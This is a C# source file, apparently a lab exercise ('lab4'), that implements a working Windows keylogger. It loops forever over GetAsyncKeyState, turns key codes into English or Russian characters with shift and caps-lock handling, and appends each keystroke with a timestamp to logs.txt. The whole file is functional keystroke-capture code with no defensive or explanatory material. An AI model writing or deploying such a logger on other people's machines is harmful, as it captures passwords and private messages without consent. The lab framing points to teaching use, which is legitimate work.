using System;
using System.IO;
using System.Runtime.InteropServices;


namespace lab4
{
    class KeyLogger
    { 
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern ushort GetKeyboardLayout([In] int idThread);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern int GetWindowThreadProcessId([In] IntPtr hWnd,[Out, Optional] IntPtr lpdwProcessId);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr GetForegroundWindow();
        public static string mss;

        static ushort GetKeyboardLayout()
        {
            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
        }
        
        static void Main()
        {
            bool capse = false;
            bool languageChange = false;
            int size = 255;
            bool[] pressedKeys = new bool[size];
            for (int i = 0; i < size; i++)
            {
                pressedKeys[i] = false;
            }
            string path = "logs.txt";
            StreamWriter sw = new StreamWriter(path, true);
            sw.WriteLine("\n"+DateTime.Now);
            sw.Close();
            while (true)
            {
                mss = GetKeyboardLayout().ToString();
                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32768 || keyState == 32769)
                    {
                        if (!pressedKeys[i])
                        {
                            pressedKeys[i] = true;
                        }
                    }
                    else
                    {
                        if (pressedKeys[i])
                        {
                            languageChange = mss == "1049" ? true : false;
                            pressedKeys[i] = false;
                            if (i == 20) capse = !capse;
                            //pressedKeys[160] - shift
                            string ch = verifyKey(i, languageChange, pressedKeys[160]);
                            if (pressedKeys[160] ^ capse) ch = ch.ToUpper();
                            //Console.Write(ch);
                            StreamWriter stream = new StreamWriter(path, true);
                            stream.Write(ch);
                            stream.Close();
                        }
                    }
                }
            }
        }
        
        public static string verifyKey(int code, bool languageChange, bool shiftPressed)
        {
            string key = "";
            if (code == 1) key = "[LMB]";
            else if (code == 2) key = "[RMB]";
            else if (code == 8) key = "[Back]";
            else if (code == 9) key = "[TAB]";
            else if (code == 13) key = "[Enter]";
            else if (code == 19) key = "[Pause]";
           // else if (code == 20) key = "[Caps Lock]";
            else if (code == 27) key = "[Esc]";
            else if (code == 32) key = " ";
            else if (code == 33) key = "[Page Up]";
            else if (code == 34) key = "[Page Down]";
            else if (code == 35) key = "[End]";
            else if (code == 36) key = "[Home]";
            else if (code == 37) key = "[Left]";
            else if (code == 38) key = "[Up]";
            else if (code == 39) key = "[Right]";
            else if (code == 40) key = "[Down]";
            else if (code == 44) key = "[Print Screen]";
            else if (code == 45) key = "[Insert]";
            else if (code == 46) key = "[Delete]";
            else if (code == 48) key = !shiftPressed ? "0" : ")";
            else if (code == 49) key = !shiftPressed ? "1" : "!";
            else if (code == 50)
            {
                if (!languageChange && shiftPressed) key = "@";
                else if (languageChange && shiftPressed) key = "\"";
                else key = "2";
            }
            else if (code == 51)
            {
                if (!languageChange && shiftPressed) key = "#";
                else if (languageChange && shiftPressed) key = "№";
                else key = "3";
            }
            else if (code == 52)
            {
                if (!languageChange && shiftPressed) key = "$";
                else if (languageChange && shiftPressed) key = ";";
                else key = "4";
            }
            else if (code == 53) key = !shiftPressed ? "5" : "%";
            else if (code == 54)
            {
                if (!languageChange && shiftPressed) key = "^";
                else if (languageChange && shiftPressed) key = ":";
                else key = "6";
            }
            else if (code == 55)
            {
                if (!languageChange && shiftPressed) key = "&";
                else if (languageChange && shiftPressed) key = "?";
                else key = "7";
            }
            else if (code == 56) key = !shiftPressed ? "8" : "*";
            else if (code == 57) key = !shiftPressed ? "9" : "(";
            else if (code == 65) key = !languageChange ? "a" : "ф";
            else if (code == 66) key = !languageChange ? "b" : "и";
            else if (code == 67) key = !languageChange ? "c" : "с";
            else if (code == 68) key = !languageChange ? "d" : "в";
            else if (code == 69) key = !languageChange ? "e" : "у";
            else if (code == 70) key = !languageChange ? "f" : "а";
            else if (code == 71) key = !languageChange ? "g" : "п";
            else if (code == 72) key = !languageChange ? "h" : "р";
            else if (code == 73) key = !languageChange ? "i" : "ш";
            else if (code == 74) key = !languageChange ? "j" : "о";
            else if (code == 75) key = !languageChange ? "k" : "л";
            else if (code == 76) key = !languageChange ? "l" : "д";
            else if (code == 77) key = !languageChange ? "m" : "ь";
            else if (code == 78) key = !languageChange ? "n" : "т";
            else if (code == 79) key = !languageChange ? "o" : "щ";
            else if (code == 80) key = !languageChange ? "p" : "з";
            else if (code == 81) key = !languageChange ? "q" : "й";
            else if (code == 82) key = !languageChange ? "r" : "к";
            else if (code == 83) key = !languageChange ? "s" : "ы";
            else if (code == 84) key = !languageChange ? "t" : "е";
            else if (code == 85) key = !languageChange ? "u" : "г";
            else if (code == 86) key = !languageChange ? "v" : "м";
            else if (code == 87) key = !languageChange ? "w" : "ц";
            else if (code == 88) key = !languageChange ? "x" : "ч";
            else if (code == 89) key = !languageChange ? "y" : "н";
            else if (code == 90) key = !languageChange ? "z" : "я";
            else if (code == 91) key = "[Windows]";
            else if (code == 92) key = "[Windows]";
            else if (code == 93) key = "[List]";
            else if (code == 96) key = "0";
            else if (code == 97) key = "1";
            else if (code == 98) key = "2";
            else if (code == 99) key = "3";
            else if (code == 100) key = "4";
            else if (code == 101) key = "5";
            else if (code == 102) key = "6";
            else if (code == 103) key = "7";
            else if (code == 104) key = "8";
            else if (code == 105) key = "9";
            else if (code == 106) key = "*";
            else if (code == 107) key = "+";
            else if (code == 109) key = "-";
            else if (code == 110) key = ",";
            else if (code == 111) key = "/";
            else if (code == 112) key = "[F1]";
            else if (code == 113) key = "[F2]";
            else if (code == 114) key = "[F3]";
            else if (code == 115) key = "[F4]";
            else if (code == 116) key = "[F5]";
            else if (code == 117) key = "[F6]";
            else if (code == 118) key = "[F7]";
            else if (code == 119) key = "[F8]";
            else if (code == 120) key = "[F9]";
            else if (code == 121) key = "[F10]";
            else if (code == 122) key = "[F11]";
            else if (code == 123) key = "[F12]";
            else if (code == 144) key = "[Num Lock]";
            else if (code == 145) key = "[Scroll Lock]";
            //else if (code == 160) key = "[Shift]";
            //else if (code == 161) key = "[Shift]";
            else if (code == 162) key = "[Ctrl]";
            else if (code == 163) key = "[Ctrl]";
            else if (code == 164) key = "[Alt]";
            else if (code == 165) key = "[Alt]";
            else if (code == 187) key = "=";
            else if (code == 186)
            {
                if (languageChange) key = "ж";
                else if (shiftPressed && !languageChange) key = ":";
                else key = ";";
            }
            else if (code == 188)
            {
                if (languageChange) key = "б";
                else if (shiftPressed && !languageChange) key = "<";
                else key = ",";
            }
            else if (code == 189) key = "-";
            else if (code == 190)
            {
                if (languageChange) key = "ю";
                else if (shiftPressed && !languageChange) key = ">";
                else key = ".";
            }
            else if (code == 192)
            {
                if (languageChange) key = "ё";
                else if (shiftPressed && !languageChange) key = "~";
                else key = "`";
            }
            else if (code == 191)
            {
                if (!languageChange && shiftPressed) key = "?";
                else if (!languageChange) key = "/";
                else if (languageChange && shiftPressed) key = ",";
                else key = "."; 
            }
            else if (code == 193) key = "/";
            else if (code == 194) key = ".";
            else if (code == 219)
            {
                if (!languageChange && shiftPressed) key = "{";
                else if (!languageChange) key = "[";
                else key = "х";
            }
            else if (code == 220)
            {
                if (!languageChange && shiftPressed) key = "|";
                else if (languageChange && shiftPressed) key = "/";
                else key = "\\";
            }
            else if (code == 221) 
            {
                if (!languageChange && shiftPressed) key = "}";
                else if (!languageChange) key = "]";
                else key = "ъ";
            }
            else if (code == 222) 
            {
                if (!languageChange && shiftPressed) key = "\"";
                else if (!languageChange) key = "'";
                else key = "э";
            }
            else if (code == 226) key = "\\";
            return key;
        }
    }
}
